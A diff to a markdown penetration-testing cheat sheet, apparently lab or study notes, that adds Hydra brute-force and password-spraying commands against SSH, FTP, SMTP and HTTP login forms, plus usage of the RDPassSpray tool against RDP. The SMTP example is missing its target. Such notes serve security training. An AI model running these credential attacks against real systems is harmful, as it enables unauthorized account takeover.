@@ -103,10 +103,26 @@ CUPP is a very cool tool that will ask you question about your target in order t
 ### SSH
 
 - `hydra -L users -P pass 10.10.4.129 -t 4 ssh ` will use the user list and password list mentioned if you put minus l or minus p you can just specify one user or one password.
+**OR**
+- `hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v`
+- `hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10` Password spraying attack
 
 ### FTP
 
-- It is pretty much the same for ftp except you need to add ftp instead of ssh in the end: `hydra -L users -P pass 10.10.4.129 -t 4 ftp`
+- It is pretty much the same for ftp except you need to add ftp instead of ssh in the end: `hydra -L users -P pass 10.10.4.129 -t 4 ftp` if you have the username you can also do has follow `hydra -l ftp -P passlist.txt ftp://10.10.x.x` (we use `ftp` as the username)
+
+### SMTP
+
+- `hydra -l email@company.xyz -P /path/to/wordlist.txt`
+
+### HTTP logins
+
+- `hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f`
+
+## RDPassSpray
+
+- Get it [here](https://github.com/xFreed0m/RDPassSpray). This tool allows you to perform attacks on RDP services
+- `python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026`
 
 ## Secretdump (Impacket)
 
